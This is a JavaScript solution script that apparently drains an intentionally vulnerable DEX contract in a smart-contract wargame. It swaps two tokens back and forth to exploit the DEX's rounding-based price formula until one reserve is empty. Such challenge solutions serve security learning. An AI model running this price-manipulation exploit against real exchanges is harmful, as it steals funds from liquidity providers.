async function pwn(maxiters = 10) { 
  // initial settings
  const T1 = await contract.token1()
  const T2 = await contract.token2()
  const DEX = contract.address
  const PLAYER = player
  let a, sa;
  let [t1_player, t2_player, t1_dex, t2_dex] = (await Promise.all([
      contract.balanceOf(T1, PLAYER),
      contract.balanceOf(T2, PLAYER),
      contract.balanceOf(T1, DEX),
      contract.balanceOf(T2, DEX)
    ])).map(bn => bn.toNumber())

  console.log(`
  Initial
    D1: ${t1_dex}
    D2: ${t2_dex}
    P1: ${t1_player}
    P2: ${t2_player}`)

  for (i = 1; i != maxiters && t1_dex > 0 && t2_dex > 0; ++i) { 
    if (i % 2) {
      // trade t1 to t2
      a = t1_player
      sa = (await contract.getSwapPrice(T1, T2, a)).toNumber()
      if (sa > t2_dex) {
        a = t1_dex
      }

      // make the call
      await contract.approve(contract.address, a)
      await contract.swap(T1, T2, a)
    } else {
      // trade t2 to t1
      a = t2_player
      sa = (await contract.getSwapPrice(T2, T1, a)).toNumber()
      if (sa > t1_dex) {
        a = t2_dex
      }

      // make the call
      await contract.approve(contract.address, a)
      await contract.swap(T2, T1, a)
    }

    // new balances
    ;[t1_player, t2_player, t1_dex, t2_dex] = (await Promise.all([
      contract.balanceOf(T1, PLAYER),
      contract.balanceOf(T2, PLAYER),
      contract.balanceOf(T1, DEX),
      contract.balanceOf(T2, DEX)
    ])).map(bn => bn.toNumber())

    console.log(
      `Trade #${i}
        D1: ${t1_dex}
        D2: ${t2_dex}
        P1: ${t1_player}
        P2: ${t2_player}
        Gave: ${a} Token ${i % 2 ? "1" : "2"}
        Took: ${sa} Token ${i % 2 ? "2" : "1"}`)

  }
}  
// await pwn()